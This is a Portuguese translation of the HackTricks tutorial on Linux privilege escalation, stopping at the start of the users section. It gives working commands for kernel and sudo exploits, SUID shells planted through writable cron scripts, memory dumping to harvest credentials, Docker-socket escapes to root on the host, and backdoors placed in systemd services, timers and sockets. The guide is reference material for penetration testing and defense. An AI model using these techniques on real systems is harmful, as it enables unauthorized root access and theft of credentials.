# Escalação de Privilégios no Linux

<details>

<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.

</details>

## Informações do Sistema

### Informações do SO

Vamos começar adquirindo conhecimento sobre o SO em execução
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Caminho

Se você **tiver permissões de escrita em qualquer pasta dentro da variável `PATH`**, você pode ser capaz de sequestrar algumas bibliotecas ou binários:
```bash
echo $PATH
```
### Informações do Ambiente

Informações interessantes, senhas ou chaves de API nas variáveis de ambiente?
```bash
(env || set) 2>/dev/null
```
### Exploits do Kernel

Verifique a versão do kernel e se existe algum exploit que possa ser usado para escalonar privilégios
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Pode encontrar uma boa lista de kernels vulneráveis e alguns **exploits já compilados** aqui: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) e [exploitdb sploits](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits).\
Outros sites onde pode encontrar alguns **exploits compilados**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Para extrair todas as versões de kernel vulneráveis daquele site, pode fazer:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Ferramentas que podem ajudar a procurar por exploits de kernel são:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute NO alvo, verifica apenas exploits para kernel 2.x)

Sempre **pesquise a versão do kernel no Google**, talvez sua versão do kernel esteja mencionada em algum exploit de kernel e assim você terá certeza de que esse exploit é válido.

### CVE-2016-5195 (DirtyCow)

Escalação de Privilégios no Linux - Kernel Linux <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Versão do Sudo

Com base nas versões vulneráveis do sudo que aparecem em:
```bash
searchsploit sudo
```
Você pode verificar se a versão do sudo é vulnerável usando este comando grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

De @sickrov
```
sudo -u#-1 /bin/bash
```
### Falha na verificação da assinatura do Dmesg

Verifique a **caixa smasher2 do HTB** para um **exemplo** de como essa vulnerabilidade poderia ser explorada
```bash
dmesg 2>/dev/null | grep "signature"
```
### Mais enumeração do sistema
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Enumerar possíveis defesas

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity

Grsecurity é um conjunto de patches de segurança para o kernel Linux, projetado para melhorar a segurança do sistema operacional. Ele inclui recursos avançados de proteção e mitigação de vulnerabilidades, como prevenção de execução de código, proteção contra estouro de buffer e restrições de capacidade. O Grsecurity é amplamente utilizado para fortalecer a segurança de sistemas Linux e proteger contra ataques de escalonamento de privilégios.
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield

Execshield é uma técnica de proteção de memória que visa prevenir a execução de código malicioso em áreas de memória específicas, como a pilha e a região de código. Essa técnica é implementada no kernel do Linux para fortalecer a segurança do sistema contra ataques de escalonamento de privilégios.
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux

O Security-Enhanced Linux (SElinux) é um mecanismo de controle de acesso obrigatório (MAC) que reforça políticas de segurança no kernel do Linux. Ele pode ser usado para restringir processos com privilégios elevados e reduzir a superfície de ataque em um sistema Linux.
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR

### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Fuga do Docker

Se estiver dentro de um contêiner do Docker, você pode tentar escapar dele:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Drives

Verifique **o que está montado e desmontado**, onde e por quê. Se algo estiver desmontado, você pode tentar montá-lo e verificar informações privadas.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Software útil

Enumerar binários úteis
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Também, verifique se **qualquer compilador está instalado**. Isso é útil se você precisar usar algum exploit de kernel, pois é recomendado compilá-lo na máquina onde você irá usá-lo (ou em uma similar)
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Software Vulnerável Instalado

Verifique a **versão dos pacotes e serviços instalados**. Talvez haja alguma versão antiga do Nagios (por exemplo) que possa ser explorada para escalonamento de privilégios...\
É recomendável verificar manualmente a versão do software instalado mais suspeito.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Se você tem acesso SSH à máquina, também pode usar o **openVAS** para verificar se há software desatualizado e vulnerável instalado na máquina.

{% hint style="info" %}
_Obsere que esses comandos mostrarão muitas informações que serão em sua maioria inúteis, portanto, é recomendável usar aplicativos como o OpenVAS ou similares que verificarão se alguma versão de software instalada é vulnerável a exploits conhecidos_
{% endhint %}

## Processos

Dê uma olhada em **quais processos** estão sendo executados e verifique se algum processo tem **mais privilégios do que deveria** (talvez um tomcat sendo executado por root?)
```bash
ps aux
ps -ef
top -n 1
```
Sempre verifique se há **depuradores de electron/cef/chromium** em execução, você pode abusar deles para escalar privilégios. O **Linpeas** detecta esses depuradores verificando o parâmetro `--inspect` na linha de comando do processo.\
Também **verifique seus privilégios sobre os binários dos processos**, talvez você consiga sobrescrever alguém.

### Monitoramento de processos

Você pode usar ferramentas como [**pspy**](https://github.com/DominicBreuker/pspy) para monitorar processos. Isso pode ser muito útil para identificar processos vulneráveis sendo executados com frequência ou quando um conjunto de requisitos é atendido.

### Memória do processo

Alguns serviços de um servidor salvam **credenciais em texto claro dentro da memória**.\
Normalmente você precisará de **privilégios de root** para ler a memória de processos que pertencem a outros usuários, portanto, isso geralmente é mais útil quando você já é root e deseja descobrir mais credenciais.\
No entanto, lembre-se de que **como usuário regular você pode ler a memória dos processos que você possui**.

{% hint style="warning" %}
Observe que hoje em dia a maioria das máquinas **não permite ptrace por padrão**, o que significa que você não pode despejar outros processos que pertencem ao seu usuário não privilegiado.

O arquivo _**/proc/sys/kernel/yama/ptrace\_scope**_ controla a acessibilidade do ptrace:

* **kernel.yama.ptrace\_scope = 0**: todos os processos podem ser depurados, desde que tenham o mesmo uid. Esta é a forma clássica de como o ptrace funcionava.
* **kernel.yama.ptrace\_scope = 1**: apenas um processo pai pode ser depurado.
* **kernel.yama.ptrace\_scope = 2**: Apenas o administrador pode usar o ptrace, pois requer a capacidade CAP\_SYS\_PTRACE.
* **kernel.yama.ptrace\_scope = 3**: Nenhum processo pode ser rastreado com ptrace. Uma reinicialização é necessária para habilitar o rastreamento novamente.
{% endhint %}

#### GDB

Se você tiver acesso à memória de um serviço FTP (por exemplo), você pode obter o Heap e procurar por suas credenciais.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### Script do GDB

{% code title="dump-memory.sh" %}
```bash
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
{% endcode %}

#### /proc/$pid/maps & /proc/$pid/mem

Para um determinado ID de processo, o arquivo **maps mostra como a memória é mapeada dentro do espaço de endereço virtual desse processo**; ele também mostra as **permissões de cada região mapeada**. O arquivo pseudo **mem expõe a própria memória dos processos**. A partir do arquivo **maps**, sabemos quais **regiões de memória são legíveis** e seus deslocamentos. Usamos essas informações para **procurar no arquivo mem e despejar todas as regiões legíveis** em um arquivo.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` fornece acesso à **memória física** do sistema, não à memória virtual. O espaço de endereço virtual do kernel pode ser acessado usando /dev/kmem.\
Normalmente, `/dev/mem` só é legível por **root** e pelo grupo **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump para Linux

ProcDump é uma reimaginação para Linux da clássica ferramenta ProcDump da suíte de ferramentas Sysinternals para Windows. Obtenha em [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Ferramentas

Para fazer dump da memória de um processo, você pode usar:

* [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
* [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Você pode remover manualmente os requisitos de root e fazer dump do processo de propriedade sua
* Script A.5 de [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root é necessário)

### Credenciais da Memória do Processo

#### Exemplo Manual

Se você descobrir que o processo do autenticador está em execução:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Você pode despejar o processo (consulte as seções anteriores para encontrar diferentes maneiras de despejar a memória de um processo) e procurar por credenciais dentro da memória:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

A ferramenta [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) irá **roubar credenciais em texto claro da memória** e de alguns **arquivos conhecidos**. Requer privilégios de root para funcionar corretamente.

| Recurso                                           | Nome do Processo      |
| ------------------------------------------------- | ---------------------- |
| Senha do GDM (Kali Desktop, Debian Desktop)       | gdm-password          |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon  |
| LightDM (Ubuntu Desktop)                          | lightdm               |
| VSFTPd (Conexões FTP Ativas)                      | vsftpd                |
| Apache2 (Sessões de Autenticação Básica HTTP Ativas) | apache2              |
| OpenSSH (Sessões SSH Ativas - Uso de Sudo)        | sshd:                 |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Tarefas agendadas/Cron jobs

Verifique se alguma tarefa agendada está vulnerável. Talvez você possa aproveitar um script sendo executado pelo root (vuln de curinga? pode modificar arquivos que o root usa? usar links simbólicos? criar arquivos específicos no diretório que o root usa?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Caminho do Cron

Por exemplo, dentro do _/etc/crontab_ você pode encontrar o PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Observe como o usuário "user" tem privilégios de escrita sobre /home/user_)

Se dentro deste crontab o usuário root tentar executar algum comando ou script sem definir o caminho. Por exemplo: _\* \* \* \* root overwrite.sh_\
Então, você pode obter um shell root usando:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron usando um script com um caractere curinga (Injeção de Caractere Curinga)

Se um script é executado pelo root e possui um "**\***" dentro de um comando, você pode explorar isso para fazer coisas inesperadas (como escalonamento de privilégios). Exemplo:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Se o caractere curinga é precedido por um caminho como** _**/algum/caminho/\***_, **não é vulnerável (mesmo** _**./\***_ **não é).**

Leia a seguinte página para mais truques de exploração de caracteres curinga:

{% content-ref url="wildcards-spare-tricks.md" %}
[wildcards-spare-tricks.md](wildcards-spare-tricks.md)
{% endcontent-ref %}

### Sobrescrita de script Cron e symlink

Se você **puder modificar um script cron** executado pelo root, você pode obter um shell muito facilmente:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Se o script executado pelo root usar um **diretório onde você tem acesso total**, talvez seja útil excluir essa pasta e **criar um link simbólico para outra pasta** que sirva a um script controlado por você.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Trabalhos cron frequentes

Você pode monitorar os processos para procurar processos que estão sendo executados a cada 1, 2 ou 5 minutos. Talvez você possa se aproveitar disso e escalar privilégios.

Por exemplo, para **monitorar a cada 0,1s durante 1 minuto**, **ordenar por comandos menos executados** e excluir os comandos que foram mais executados, você pode fazer:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Você também pode usar** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (isso irá monitorar e listar todos os processos que são iniciados).

### Trabalhos cron invisíveis

É possível criar um trabalho cron **colocando um retorno de carro após um comentário** (sem caractere de nova linha), e o trabalho cron irá funcionar. Exemplo (observe o caractere de retorno de carro):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Serviços

### Arquivos _.service_ graváveis

Verifique se você pode escrever em algum arquivo `.service`, se puder, você **poderá modificá-lo** para que ele **execute** sua **backdoor quando** o serviço for **iniciado**, **reiniciado** ou **parado** (talvez seja necessário aguardar até que a máquina seja reiniciada).\
Por exemplo, crie sua backdoor dentro do arquivo .service com **`ExecStart=/tmp/script.sh`**

### Binários de serviço graváveis

Lembre-se de que se você tiver **permissões de escrita sobre binários executados por serviços**, você pode alterá-los para backdoors, para que quando os serviços forem reexecutados, as backdoors também sejam executadas.

### PATH do systemd - Caminhos Relativos

Você pode ver o PATH usado pelo **systemd** com:
```bash
systemctl show-environment
```
Se você descobrir que pode **escrever** em qualquer uma das pastas do caminho, talvez consiga **aumentar os privilégios**. Você precisa procurar por **caminhos relativos sendo usados em arquivos de configuração de serviços** como:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Em seguida, crie um **executável** com o **mesmo nome que o binário do caminho relativo** dentro da pasta do PATH do systemd em que você pode escrever e, quando o serviço for solicitado a executar a ação vulnerável (**Start**, **Stop**, **Reload**), sua **porta dos fundos será executada** (usuários não privilegiados geralmente não podem iniciar/parar serviços, mas verifique se você pode usar `sudo -l`).

**Saiba mais sobre serviços com `man systemd.service`.**

## **Temporizadores**

**Temporizadores** são arquivos de unidade do systemd cujo nome termina em `**.timer**` que controlam arquivos ou eventos `**.service**`. Os **temporizadores** podem ser usados como uma alternativa ao cron, pois possuem suporte integrado para eventos de tempo de calendário e eventos de tempo monótono e podem ser executados de forma assíncrona.

Você pode enumerar todos os temporizadores com:
```bash
systemctl list-timers --all
```
### Timers graváveis

Se você pode modificar um timer, você pode fazer com que ele execute alguns existentes de systemd.unit (como um `.service` ou um `.target`)
```bash
Unit=backdoor.service
```
Na documentação, você pode ler o que é a Unidade:

> A unidade a ser ativada quando este temporizador expirar. O argumento é um nome de unidade, cujo sufixo não é ".timer". Se não for especificado, esse valor será padrão para um serviço que tenha o mesmo nome que a unidade do temporizador, exceto pelo sufixo. (Veja acima.) É recomendável que o nome da unidade ativada e o nome da unidade do temporizador sejam nomeados de forma idêntica, exceto pelo sufixo.

Portanto, para abusar dessa permissão, você precisaria:

* Encontrar alguma unidade systemd (como um `.service`) que esteja **executando um binário gravável**
* Encontrar alguma unidade systemd que esteja **executando um caminho relativo** e que você tenha **privilégios de gravação** sobre o **PATH do systemd** (para se passar por esse executável)

**Saiba mais sobre temporizadores com `man systemd.timer`.**

### **Ativando o Temporizador**

Para ativar um temporizador, você precisa de privilégios de root e executar:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Observe que o **temporizador** é **ativado** criando um link simbólico para ele em `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Os Sockets de Domínio Unix (UDS) permitem a **comunicação entre processos** nos mesmos ou em diferentes computadores dentro de modelos cliente-servidor. Eles utilizam arquivos de descritores Unix padrão para comunicação entre computadores e são configurados por meio de arquivos `.socket`.

Os Sockets podem ser configurados usando arquivos `.socket`.

**Saiba mais sobre sockets com `man systemd.socket`.** Dentro deste arquivo, vários parâmetros interessantes podem ser configurados:

* `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Essas opções são diferentes, mas um resumo é usado para **indicar onde ele vai escutar** o socket (o caminho do arquivo de socket AF\_UNIX, o número de porta IPv4/6 para escutar, etc.)
* `Accept`: Aceita um argumento booleano. Se for **verdadeiro**, uma **instância de serviço é iniciada para cada conexão de entrada** e apenas o socket de conexão é passado para ele. Se for **falso**, todos os sockets de escuta em si são **passados para a unidade de serviço iniciada**, e apenas uma unidade de serviço é iniciada para todas as conexões. Esse valor é ignorado para sockets de datagrama e FIFOs, onde uma única unidade de serviço lida incondicionalmente com todo o tráfego de entrada. **O padrão é falso**. Por motivos de desempenho, é recomendado escrever novos daemons apenas de uma maneira adequada para `Accept=no`.
* `ExecStartPre`, `ExecStartPost`: Aceita uma ou mais linhas de comando, que são **executadas antes** ou **depois** dos **sockets**/FIFOs de escuta serem **criados** e vinculados, respectivamente. O primeiro token da linha de comando deve ser um nome de arquivo absoluto, seguido por argumentos para o processo.
* `ExecStopPre`, `ExecStopPost`: Comandos adicionais que são **executados antes** ou **depois** dos **sockets**/FIFOs de escuta serem **fechados** e removidos, respectivamente.
* `Service`: Especifica o nome da **unidade de serviço** a **ativar** no **tráfego de entrada**. Essa configuração só é permitida para sockets com Accept=no. O padrão é o serviço que tem o mesmo nome que o socket (com o sufixo substituído). Na maioria dos casos, não deve ser necessário usar essa opção.

### Arquivos .socket graváveis

Se você encontrar um arquivo `.socket` **gravável**, você pode **adicionar** no início da seção `[Socket]` algo como: `ExecStartPre=/home/kali/sys/backdoor` e a porta dos fundos será executada antes que o socket seja criado. Portanto, você **provavelmente precisará esperar até que a máquina seja reiniciada.**\
_Obs.: o sistema deve estar usando essa configuração de arquivo de socket, caso contrário, a porta dos fundos não será executada_

### Sockets graváveis

Se você **identificar algum socket gravável** (_agora estamos falando sobre Sockets Unix e não sobre os arquivos de configuração `.socket`_), então **você pode se comunicar** com esse socket e talvez explorar uma vulnerabilidade.

### Enumerar Sockets Unix
```bash
netstat -a -p --unix
```
### Conexão bruta
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exemplo de exploração:**

{% content-ref url="socket-command-injection.md" %}
[socket-command-injection.md](socket-command-injection.md)
{% endcontent-ref %}

### Sockets HTTP

Observe que pode haver alguns **sockets ouvindo por requisições HTTP** (_Não estou falando sobre arquivos .socket, mas sim sobre arquivos que atuam como sockets Unix_). Você pode verificar isso com:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Se o socket **responder com uma solicitação HTTP**, então você pode **comunicar-se** com ele e talvez **explorar alguma vulnerabilidade**.

### Socket Docker Gravável

O socket do Docker, frequentemente encontrado em `/var/run/docker.sock`, é um arquivo crítico que deve ser protegido. Por padrão, ele é gravável pelo usuário `root` e membros do grupo `docker`. Possuir acesso de escrita a este socket pode levar à escalada de privilégios. Aqui está uma explicação de como isso pode ser feito e métodos alternativos se o Docker CLI não estiver disponível.

#### **Escalação de Privilégios com Docker CLI**

Se você tiver acesso de escrita ao socket do Docker, você pode escalar privilégios usando os seguintes comandos:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Estes comandos permitem executar um contêiner com acesso de nível raiz ao sistema de arquivos do host.

#### **Usando a API do Docker diretamente**

Nos casos em que o Docker CLI não está disponível, o socket do Docker ainda pode ser manipulado usando a API do Docker e comandos `curl`.

1. **Listar Imagens do Docker:**
Obter a lista de imagens disponíveis.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2. **Criar um Contêiner:**
Enviar uma solicitação para criar um contêiner que monta o diretório raiz do sistema host.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Inicie o contêiner recém-criado:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3. **Anexar ao Contêiner:**
Use `socat` para estabelecer uma conexão com o contêiner, permitindo a execução de comandos dentro dele.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Após configurar a conexão `socat`, você pode executar comandos diretamente no contêiner com acesso de nível raiz ao sistema de arquivos do host.

### Outros

Observe que se você tiver permissões de gravação sobre o socket do docker porque está **dentro do grupo `docker`**, você tem [**mais maneiras de elevar privilégios**](interesting-groups-linux-pe/#docker-group). Se a [**API do docker estiver ouvindo em uma porta** você também pode ser capaz de comprometê-la](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Confira **mais maneiras de escapar do docker ou abusar dele para elevar privilégios** em:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Escalação de privilégios do Containerd (ctr)

Se você descobrir que pode usar o comando **`ctr`**, leia a seguinte página, pois **você pode ser capaz de abusar dele para elevar privilégios**:

{% content-ref url="containerd-ctr-privilege-escalation.md" %}
[containerd-ctr-privilege-escalation.md](containerd-ctr-privilege-escalation.md)
{% endcontent-ref %}

## Escalação de privilégios do **RunC**

Se você descobrir que pode usar o comando **`runc`**, leia a seguinte página, pois **você pode ser capaz de abusar dele para elevar privilégios**:

{% content-ref url="runc-privilege-escalation.md" %}
[runc-privilege-escalation.md](runc-privilege-escalation.md)
{% endcontent-ref %}

## **D-Bus**

D-Bus é um sofisticado **sistema de Comunicação entre Processos (IPC)** que permite que aplicativos interajam e compartilhem dados de forma eficiente. Projetado com o sistema Linux moderno em mente, ele oferece um framework robusto para diferentes formas de comunicação de aplicativos.

O sistema é versátil, suportando IPC básico que aprimora a troca de dados entre processos, lembrando **sockets de domínio UNIX aprimorados**. Além disso, ele auxilia na transmissão de eventos ou sinais, promovendo a integração perfeita entre os componentes do sistema. Por exemplo, um sinal de um daemon Bluetooth sobre uma chamada recebida pode fazer com que um player de música seja silenciado, aprimorando a experiência do usuário. Além disso, o D-Bus suporta um sistema de objetos remotos, simplificando solicitações de serviço e invocações de métodos entre aplicativos, simplificando processos que tradicionalmente eram complexos.

O D-Bus opera em um **modelo de permitir/negar**, gerenciando permissões de mensagem (chamadas de método, emissões de sinal, etc.) com base no efeito cumulativo de regras de política correspondentes. Essas políticas especificam interações com o barramento, potencialmente permitindo a escalada de privilégios por meio da exploração dessas permissões.

Um exemplo de tal política em `/etc/dbus-1/system.d/wpa_supplicant.conf` é fornecido, detalhando permissões para o usuário root possuir, enviar e receber mensagens de `fi.w1.wpa_supplicant1`.

Políticas sem um usuário ou grupo especificado se aplicam universalmente, enquanto políticas de contexto "padrão" se aplicam a todos que não são abrangidos por outras políticas específicas.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Aprenda como enumerar e explorar uma comunicação D-Bus aqui:**

{% content-ref url="d-bus-enumeration-and-command-injection-privilege-escalation.md" %}
[d-bus-enumeration-and-command-injection-privilege-escalation.md](d-bus-enumeration-and-command-injection-privilege-escalation.md)
{% endcontent-ref %}

## **Rede**

Sempre é interessante enumerar a rede e descobrir a posição da máquina.

### Enumeração genérica
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Portas abertas

Sempre verifique os serviços de rede em execução na máquina com os quais você não conseguiu interagir antes de acessá-la:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Verifique se você consegue farejar o tráfego. Se conseguir, você poderá capturar algumas credenciais.
```
timeout 1 tcpdump
```
## Usuários

### Enumeração Genérica

